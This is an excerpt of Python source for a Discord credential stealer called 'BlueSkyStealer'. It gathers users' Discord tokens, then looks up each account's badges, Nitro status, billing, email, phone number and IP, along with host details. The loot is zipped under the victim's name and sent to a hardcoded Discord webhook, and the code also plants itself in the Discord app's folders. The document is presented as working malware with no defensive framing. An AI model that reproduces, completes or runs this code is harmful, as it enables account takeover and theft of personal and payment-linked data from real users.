...
config = {
    ...
    'webhook': "https://discord.com/api/webhooks/1035503542435319808/UbjdZI_MHS2xKsLIwBOAcHxeur-krNc1Q6LsQ-g2p6VNHNayAeXPuRzdYl67n7c3orAy",
...
class BlueSkyStealer_v1(functions):
    def __init__(self):
                    ...
                    if match(r'app-(\d*\.\d*)*', __dir):
                        ...
                        if os.path.exists(inj_path):
                            if self.startup_loc not in argv[0]:
                                try:
                                    os.makedirs(
                                        inj_path+'BlueSkyStealer', exist_ok=True)
    ...
    def finish(self):
        ...
        for token in self.tokens:
            ...
            flags = j['flags']
            if (flags == 1):
                badges += "<:staff:891346298932981783>"
            if (flags == 2):
                badges += "<:Partner:905936977348661379>"
            if (flags == 4):
                badges += "<:HypesquadEvents:905936171698372669>"
            if (flags == 8):
                badges += "<:BugHunter:905936706866405447>"
            if (flags == 64):
                badges += "<:Bravery:905936237838340116>"
            if (flags == 128):
                badges += "<:Brilliance:905936420655472691>"
            if (flags == 256):
                badges += "<:Balance:905936071819399219>"
            if (flags == 512):
                badges += "<:Zearly:908649387268407306>"
            if (flags == 16384):
                badges += "<:BugHunterGold:905936767096610837>"
            if (flags == 131072):
                badges += "<:devoloper:909358802975989790>"
            if (badges == ""):
                badges = "`None`"
            email = j.get("email")
            phone = j.get("phone") if j.get(
            ...
            nitro_data = httpx.get(
                self.baseurl+'/billing/subscriptions', headers=self.getHeaders(token)).json()
            has_nitro = False
            if bool(len(nitro_data) == 1):
                has_nitro = "<:Nitro:905937244072861768>"
            elif bool(len(nitro_data) == 2):
                has_nitro = "<:Nitro:905937244072861768> <a:BoostBadged:918249904659390524>"
            else:
                has_nitro = "`No Nitro (broke)`"
        ...
        _zipfile = os.path.join(
            self.appdata, f'BlueSky-[{Victim}].zip')
        ...
        injection = {
            "avatar_url":"https://media.ldlc.com/r1600/mkp/7e78c0953372493ca37a0e81af54fe25.jpeg",
            "embeds": [
                {
                    "author":{
                        "name": "Stealed Successfully "
                    },
                    "description":f"Home Dir: {homed}\nComputer Hostname: {hostname}\nUsed Memory: {ram}%",
                    "color": 3092790,
            ...
            "embeds": [
                {
                    "author": {
                        "name": f"{user} ({user_id})",
                        "icon_url": "https://static.wikia.nocookie.net/breakingbad/images/4/43/Bluemeth.png/revision/latest?cb=20130722044536"
                    },
                    "description": f"\n<:1money:863005931456167947> **Token:** \n```{token}```\n<a:8243blackbat:1035533498259341353> **Badges:**\n{badges}\n\n<a:3342emoshit:1035533476612558848> **Nitro Type:**\n{has_nitro}\n\n<:playboy:917501284544827474> **Contain Billing?:**\n{billing}\n\n<:3731_vinyl_disc:1035533478458044416> **IP:**\n`{ip}`\n\n<:8459samblacktired:1035533499953844224> **Email:**\n`{email}`\n\n<:1256fblackrose:1035533469620637706> **Phone:**\n`{phone}`\n\n",
                    "color": 3092790,

                    "thumbnail": {
                      "url": "https://media.ldlc.com/r1600/mkp/7e78c0953372493ca37a0e81af54fe25.jpeg"
                    },
                    "footer": {
                      "text": "BlueSkyStealer"
                    }
        ...
        httpx.post(self.webhook, json=injection)
...
if __name__ == "__main__" and os.name == "nt":
    asyncio.run(BlueSkyStealer_v1().init())